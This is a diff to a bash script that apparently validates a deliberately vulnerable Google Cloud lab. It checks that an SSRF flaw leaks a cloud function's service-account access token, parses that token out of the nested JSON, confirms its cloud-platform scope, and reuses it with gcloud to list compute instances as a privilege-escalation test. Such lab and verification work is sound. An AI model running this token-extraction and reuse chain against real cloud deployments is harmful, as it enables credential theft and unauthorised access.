@@ -274,6 +274,18 @@ fi
 # Step 10: Check invocation script on VM
 print_step "Checking function invocation script..."
 
+# First, check if the local script exists
+if [ -f "./invoke_monitoring_function.sh" ]; then
+    print_info "Copying latest invocation script to VM..."
+    if gcloud compute scp ./invoke_monitoring_function.sh app-prod-instance-module2:~/ --zone=$ZONE --quiet 2>&1 | grep -q "ERROR"; then
+        print_fail "Failed to copy invocation script to VM"
+    else
+        print_pass "Successfully copied invocation script to VM"
+    fi
+else
+    print_info "No local invoke_monitoring_function.sh found to copy"
+fi
+
 if exec_on_vm "test -f ./invoke_monitoring_function.sh && echo 'exists'" | grep -q "exists"; then
     print_pass "Invocation script found on VM"
     
@@ -331,14 +343,19 @@ if echo "$SSRF_RESPONSE" | grep -q "function_account"; then
     print_pass "Access token exposed via SSRF vulnerability"
     print_info "Function's service account token is accessible"
     
-    # Extract the token from the response
-    EXTRACTED_TOKEN=$(echo "$SSRF_RESPONSE" | grep -o '"function_account": "[^"]*"' | cut -d'"' -f4)
+    # Extract the token from the response - handle nested JSON
+    # First extract the function_account value, then parse the nested access_token
+    FUNCTION_ACCOUNT=$(echo "$SSRF_RESPONSE" | grep -o '"function_account": "[^"]*"' | cut -d'"' -f4)
+    
+    # The function_account contains escaped JSON, so we need to parse it
+    # Use grep and cut to extract the access_token value from the nested JSON
+    EXTRACTED_TOKEN=$(echo "$FUNCTION_ACCOUNT" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
     
     if [ -n "$EXTRACTED_TOKEN" ]; then
         print_info "Validating extracted token's permissions..."
         
         # Check the extracted token's scopes
-        TOKEN_INFO=$(exec_on_vm "curl -s 'https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$EXTRACTED_TOKEN' 2>/dev/null")
+        TOKEN_INFO=$(exec_on_vm "curl -s \"https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=${EXTRACTED_TOKEN}\" 2>/dev/null")
         
         if echo "$TOKEN_INFO" | grep -q "cloud-platform"; then
             print_pass "Extracted token has cloud-platform scope (full GCP access)!"
@@ -350,7 +367,7 @@ if echo "$SSRF_RESPONSE" | grep -q "function_account"; then
             
             # Test that the new token can do things the VM token cannot
             print_info "Testing privilege escalation - attempting to list compute instances with function token..."
-            COMPUTE_TEST=$(exec_on_vm "export CLOUDSDK_AUTH_ACCESS_TOKEN='$EXTRACTED_TOKEN' && gcloud compute instances list --limit=1 2>&1")
+            COMPUTE_TEST=$(exec_on_vm "export CLOUDSDK_AUTH_ACCESS_TOKEN=\"${EXTRACTED_TOKEN}\" && gcloud compute instances list --limit=1 2>&1")
             
             if echo "$COMPUTE_TEST" | grep -q "NAME\|ZONE\|MACHINE_TYPE"; then
                 print_pass "Function token can list compute instances (VM token cannot)!"
